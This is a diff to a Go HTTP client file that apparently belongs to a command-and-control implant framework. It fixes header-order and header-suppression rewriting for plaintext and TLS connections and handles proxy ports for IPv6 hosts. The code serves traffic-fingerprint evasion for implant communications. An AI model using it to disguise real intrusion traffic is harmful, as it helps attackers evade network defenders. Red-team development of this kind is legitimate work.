@@ -18,7 +18,7 @@ package httpclient
 	along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */
 
-// {{if or .HTTPC2ImplantConfig.HttpHeaderOrder .HTTPC2ImplantConfig.HttpSuppressHeaders}}
+// {{if and .Config.IncludeHTTP (or .HTTPC2ImplantConfig.HttpHeaderOrder .HTTPC2ImplantConfig.HttpSuppressHeaders)}}
 
 import (
 	"bufio"
@@ -199,16 +199,9 @@ func rewriteHeaderBlock(block []byte, order, orderLower []string, suppress map[s
 // 原生 HTTPS 路径需要接管拨号+握手(并自行处理代理隧道,因为
 // DialTLSContext 生效时 transport.Proxy 被忽略);明文路径直接包装 Dial。
 func installRequestFingerprint(transport *http.Transport, opts *HTTPOptions, proxyURL *url.URL, secure bool) {
-	if base := transport.DialTLSContext; base != nil {
-		transport.DialTLSContext = func(ctx context.Context, network, addr string) (net.Conn, error) {
-			conn, err := base(ctx, network, addr)
-			if err != nil {
-				return nil, err
-			}
-			return newFingerprintConn(conn), nil
-		}
-		return
-	}
+	// 明文 HTTP 必须优先处理:transport 走的是 Dial,DialTLSContext 即使被 uTLS
+	// 设置也不会被调用。若先判断 DialTLSContext 就会把改写器挂到一条用不到
+	// 的连接上,导致头序在明文场景静默失效。
 	if !secure {
 		baseDial := transport.Dial
 		if baseDial == nil {
@@ -216,6 +209,16 @@ func installRequestFingerprint(transport *http.Transport, opts *HTTPOptions, pro
 		}
 		transport.Dial = func(network, addr string) (net.Conn, error) {
 			conn, err := baseDial(network, addr)
+			if err != nil {
+				return nil, err
+			}
+			return newFingerprintConn(conn), nil
+		}
+		return
+	}
+	if base := transport.DialTLSContext; base != nil {
+		transport.DialTLSContext = func(ctx context.Context, network, addr string) (net.Conn, error) {
+			conn, err := base(ctx, network, addr)
 			if err != nil {
 				return nil, err
 			}
@@ -267,11 +270,12 @@ func fpDialTarget(ctx context.Context, dialer *net.Dialer, target string, proxyU
 		return nil, errors.New("header fingerprint rewrite with native TLS only supports http/https CONNECT proxies")
 	}
 	proxyAddr := proxyURL.Host
-	if !strings.Contains(proxyAddr, ":") {
+	if _, _, err := net.SplitHostPort(proxyAddr); err != nil {
+		// 无端口(含 IPv6 字面量 [::1]):按 scheme 补默认端口
 		if strings.EqualFold(proxyURL.Scheme, "https") {
-			proxyAddr += ":443"
+			proxyAddr = net.JoinHostPort(proxyURL.Hostname(), "443")
 		} else {
-			proxyAddr += ":80"
+			proxyAddr = net.JoinHostPort(proxyURL.Hostname(), "80")
 		}
 	}
 	conn, err := dialer.DialContext(ctx, "tcp", proxyAddr)
